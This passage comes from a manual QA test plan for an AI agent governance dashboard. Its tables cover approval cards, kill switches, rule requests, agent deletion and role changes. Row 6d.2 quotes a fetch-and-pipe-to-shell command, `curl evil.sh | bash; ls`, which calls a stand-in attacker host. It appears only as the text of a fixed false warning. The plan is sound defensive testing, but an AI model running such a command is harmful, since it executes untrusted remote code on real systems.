| **6b.5** | Two people, two browsers | Malek starts a long task; Kinan cancels it from _Active agent sessions_ while Malek watches his own conversation | Malek's conversation shows **Stopping** without a reload, then the task disappears from both screens; nobody's screen keeps offering a Cancel that can only be refused                                        |

**Why there is no row for a full queue.** The limit on requests filed by Always allow and
Would allow is 40 plus 20 for every account in the organisation, 120 with the four
accounts §0 sets up. `src/governance/rule-requests.test.ts` and
`src/governance/escalation-allow-always.test.ts` drive the real queue past it. What a
person checks is the other half: that a request which _did_ save produces no dialog.

**A limit to observe rather than test.** On a chat deployment the queue-full warning is
not delivered to Discord or Telegram (`docs-notes/CHAT-DEPLOYMENTS.md`).

## 6c. Rows from the dashboard QA pass (2026-09-12 and 13)

Each row is a defect found and fixed in that pass (findings 346–364), or a decision built
after it (T68). The row fails if the defect is back.

| #         | Who                                                                             | Do this                                                                                                                              | Expect                                                                                                                                                                                                                                                                          |
| --------- | ------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **6c.1**  | Anyone with an agent, on the governance page                                    | From _Your agents_, ask the agent to do something no rule covers, with escalation on                                                 | Within a few seconds an approval card appears **on the governance page**, in a band above the sections, not as the Control UI's pop-up (T68). **No card, followed by a row in _Awaiting your decision_ saying it timed out, is finding 347**                                    |
| **6c.2**  | Same                                                                            | Ask again, and leave the card unanswered                                                                                             | When the escalation timeout lapses (30 seconds with §0's setting) the card goes and the row in _Awaiting your decision_ says **timed out**. The cancelled case is row 6c.11                                                                                                     |
| **6c.3**  | Anyone                                                                          | Press **Remove** on a rule, or any button that asks "Are you sure?", then press **Escape**                                           | The question closes and **you are still on the governance page** (finding 349)                                                                                                                                                                                                  |
| **6c.4**  | Kinan                                                                           | Sign in, open every section, sign out. Then open the browser's developer tools → **Application** → **Cache Storage**                 | Only addresses containing `/assets/` (and the page itself) are stored. **Any address containing `governance` is finding 346**                                                                                                                                                   |
| **6c.5**  | Kinan                                                                           | While signed in, stop the Gateway for a minute, then start it again                                                                  | Within about 15 seconds the page says some panels could not be reloaded; pressing a button says _"Could not reach the Gateway…"_; once the Gateway is back, that sentence is replaced by one saying it is reachable again and your last action may not have taken effect        |
| **6c.6**  | Anyone with an agent                                                            | As row 3.2.12, but **close the tab** instead of reloading, then open the dashboard again                                             | The task is still **Running**, with Cancel, in the conversation and in _Active agent sessions_                                                                                                                                                                                  |
| **6c.7**  | Kinan                                                                           | Engage the **kill switch** on an agent, then Release it                                                                              | The result appears where you pressed, **names the agent**, and goes away after Release                                                                                                                                                                                          |
| **6c.8**  | Kinan + a User                                                                  | With the User's conversation with an agent open, unassign that agent from them in _Accounts_                                         | Within about 15 seconds the User's conversation is replaced by a sentence saying the agent is no longer assigned to them (finding 354)                                                                                                                                          |
| **6c.9**  | A User                                                                          | In _Rule requests_, paste a reason longer than 500 characters and submit                                                             | The field stops at 500 characters and its hint says so; the request that saves carries the whole of what the box shows (finding 362)                                                                                                                                            |
| **6c.10** | A User with an agent, an Administrator, and a Viewer, each on their own machine | The User asks the agent for something no rule covers                                                                                 | The card appears for the User and the Administrator, **and not for the Viewer**, and in nobody's Control UI pop-up. The Administrator presses **Allow once**: the card closes for both, and the _Audit ledger_ shows the approval answered by the Administrator's account (T68) |
| **6c.11** | A User with an agent                                                            | Ask for something no rule covers, and while its card is up press **Cancel** on the task in the conversation                          | Within a few seconds the card closes by itself, and _Awaiting your decision_ says **cancelled** (finding 363)                                                                                                                                                                   |
| **6c.12** | Kinan + a User with an agent                                                    | The User asks for something no rule covers. While the card is up on the User's screen, change the User to a **Viewer** in _Accounts_ | Within about 15 seconds the card leaves the User's screen, along with the sections a Viewer does not see                                                                                                                                                                        |
| **6c.13** | Kinan + a User with an agent                                                    | The User asks for something no rule covers. While its card is up, Kinan engages the **kill switch** on that agent                    | Within a few seconds the card closes, and the User's conversation says the agent was stopped by the emergency kill switch. The kill switch's result reports one run aborted, not none (finding 364)                                                                             |

## 6d. Rows from the work after the push (2026-09-13 and 14)

The independent review's last item, bug 8, the request queue's approval preview, a
false warning on the folder grant's own pattern, A11, and findings 366 and 367 from the
QA of 2026-09-14. None has been pressed by a person.

| #         | Who                   | Do this                                                                                                                                                                  | Expect                                                                                                                                                                                                                             |
| --------- | --------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **6d.1**  | Mohammad              | Add an allow rule for one agent with a 60-minute lifetime, then add the identical rule with no lifetime                                                                  | _"Rule added. It extends an earlier temporary rule"_, saying the grant no longer expires. The ledger entry for the new rule names the temporary rule it extends (bug 8)                                                            |
| **6d.2**  | Mohammad              | Use **Allow a folder, except…** for `src` with no exceptions                                                                                                             | The rule is written as `^src(/\|$)` and **no** "broader than it looks" warning appears. A warning quoting `curl evil.sh \| bash; ls` is the false warning fixed on 2026-09-13                                                      |
| **6d.3**  | Malek, then Mohammad  | Malek requests a command rule with the pattern `ls` (no anchors) for his agent. Mohammad reads the pending row                                                           | Under _"If this is approved"_ the row warns the pattern is not anchored, **before** anybody approves. Approving still works                                                                                                        |
| **6d.4**  | Malek, then Mohammad  | Mohammad adds a temporary rule `^pwd$` for Malek's agent. Malek requests the same pattern for the same agent. Mohammad reads the pending row                             | Under _"If this is approved"_ the row says approving would extend the temporary rule                                                                                                                                               |
| **6d.5**  | Malek, then Mohammad  | In _Rule requests_, **Request a change for one agent**: your agent, posture, **Monitor**, a reason. Mohammad approves it                                                 | The request appears as _"Change posture to “monitor”"_ for your agent. After approval, Policy shows the agent's posture override as Monitor, and the ledger records the change against **Mohammad** (A11)                          |
| **6d.6**  | Malek                 | Open the value list for a posture in that form                                                                                                                           | **Enforce** and **Monitor** only, **no Off**. Switch the setting to escalation: **Ask a human** and **Deny**, and a value chosen for posture is not kept                                                                           |
| **6d.7**  | Malek                 | With `curl` and your session, `POST /control-ui/governance/rule-requests` with `{ "agentId": "<yours>", "setting": "mode", "value": "off", "reason": "test" }`           | **400**: _"Governance cannot be switched off for one agent…"_, and nothing appears in the queue. An accepted request is finding 365: it would be approved, recorded, and never applied                                             |
| **6d.8**  | Malek, then Mohammad  | Request a **path** rule, choose **read only** in the new _Read or write_ box, and submit. Mohammad reads the row and approves                                            | The row says **path (read)**. After approval the rule list shows the rule as read-only. Ask the agent to write under that path: still refused or asks                                                                              |
| **6d.9**  | A User with no agents | Look at _Rule requests_                                                                                                                                                  | **Request a change for one agent** is a sentence saying no agents are assigned, not a form                                                                                                                                         |
| **6d.10** | Kinan                 | Press **Lock down** in the kill switch                                                                                                                                   | **A confirmation first**, as Stop asks in _Active agent sessions_. Cancel it: nothing is locked                                                                                                                                    |
| **6d.11** | Malek, then Mohammad  | Malek requests a path rule for his agent. Mohammad removes that agent with **delete** (not unregister), then reads _Rule requests_                                       | Malek's request says the agent it was made for has been deleted, **Approve** cannot be pressed, and **Reject** works. An approvable row is finding 366: approving would hand the rule to the next agent registered under that name |
| **6d.12** | Kinan, then Mohammad  | Kinan switches off the privilege-escalation denial. Mohammad opens Policy                                                                                                | Mohammad sees the rule named, marked switched off by Root, with no control. Kinan sees the same row with **Switch on** (finding 367)                                                                                               |
| **6d.13** | Malek                 | Start a task on your agent, then open _Active agent sessions_ while it runs                                                                                              | The row shows **Stop agent** and **no Observe** button. An Observe button that answers "requires administrator" is finding 369. Mohammad, on the same row, does see **Observe**                                                    |
| **6d.14** | Malek, then Mohammad  | After 6d.11, Mohammad registers a new agent under the deleted agent's name, then reads _Rule requests_ again                                                             | Malek's old request is still marked and **Approve** still cannot be pressed. An approvable row is finding 370: the old request would grant the rule to the new agent                                                               |
| **6d.15** | Malek, then Mohammad  | Malek prompts his agent into an escalation and leaves the card waiting. Mohammad deletes the agent and registers a new one under the same name within the card's timeout | The card disappears for everybody and cannot be answered; the task's action is refused when it lapses. A card **Allow once** can still press is finding 370                                                                        |
| **6d.16** | Mohammad              | With a question waiting in _Awaiting your decision_ for an agent, delete that agent, register a new one under the same name, then press **Allow** on the old question    | **Refused**, saying the agent was deleted since the question was asked; **Deny** still clears it, and no rule request appears. A proposal filed for the new agent is finding 370                                                   |

## 7. When you are done

1. **Collect the screenshots.** Every refusal you photographed is Chapter 4 evidence.
2. **List every row where the outcome was invisible.** Not wrong: _invisible_. Those
   are the findings, and they are the ones no test can produce.
3. **List every refusal that did not say what to do instead.** Same.
4. Record the findings in `GOVERNANCE.md`'s register with the next numbers, and the
   narrative in `mg/SESSION-LOG-2026-09.md`.

**What "passing" means here.** The rows going the right way are not the result. The
result is the handful that do not, because every finding this project has recorded from
operating the system rather than reading it was one no amount of reading would have
produced: the VPS trip found three, and Kinan using the dashboard found two, then nine
more.
